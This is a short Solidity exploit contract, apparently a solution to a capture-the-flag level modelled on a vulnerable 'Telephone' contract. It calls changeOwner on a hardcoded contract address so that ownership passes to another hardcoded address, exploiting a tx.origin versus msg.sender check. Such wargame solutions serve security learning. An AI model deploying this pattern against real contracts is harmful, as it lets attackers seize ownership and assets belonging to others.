// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface Telephone {
      function changeOwner(address owner) external;
}

contract Attack {
    Telephone tele;

    constructor() public {}

    function attack() public {
        tele = Telephone(0xF9bB78b97D2761b6f29ba52D0236aBa8736E036d);
        tele.changeOwner(0x92205391c067DFC7a9C818079734a8cb2A3cED46);
    }
}
